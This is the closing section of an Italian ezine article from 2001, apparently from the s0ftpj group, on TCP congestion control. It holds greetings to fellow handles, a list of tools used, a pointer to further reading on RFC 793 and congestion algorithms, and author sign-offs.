+	rfc793 - Comer, non ricordo dettagli, ma lei e la 791 sono
+	utili da conoscere se vi interessate di queste cose.
+
+-- S A L U T I   T N X   N O T E   C A S U A L I   E   B O H --
+
+per fornire distrazioni sempre nuove :) e per molte altre cose...
+	hotuna n0l1fe smaster naif vodka l0rdo smav [-_-] naylon raptor awgn 
+	fusys noteof cavallo raist_xol del0 brigante
+per il supporto tecnico: 
+	gcc, vi, tcpdump, man, links, acrobat reader, grep
+per essere tale: 
+	picula
+
+QUESTO ARTICOLO non e` particolarmente tecnico xke` speravo di renderlo
+comprensibile a + o - tutti, per chi fosse interessato ad approfondire gli
+studi sugli algortitmi che controllano la congesione oltre all'RFC potrebbe
+guardare su http://www.mkp.com/index.html dove si trova un guida sul
+networking e alcune pagine che spiegano il funzionamento degli algortimi della
+congestione, questo e` sicuramente meno dettagliato dell'rfc, ma tra questo
+articolo e quell'introduzione la lettura dell' rfc sara` + digeribile.
+
+saluto i tutor dell'aula 101 dell'unimi.it che un giorno sentendomi parlare
+con un altro mi dissero: "ma che dici va`?? non puoi aumentare la velocita`
+di un download hahahaha!" eeeeeehhhhh..... sia lodato il TCP :)
+
+e` tutto fuorche` tutto, xke` spulciando bene l'rfc si puo` trovare altro.
+
+[cip] vecna - vecna@s0ftpj.org - 14/05/2001, ma qualcuno ha detto md5 ? 
+[$id] vecna - vecna@s0ftpj.org - 21/05/2001, il naviglio verso la cina.
+
+
+==============================================================================
+--------------------------------[ EOF  8/18 ]---------------------------------
+==============================================================================
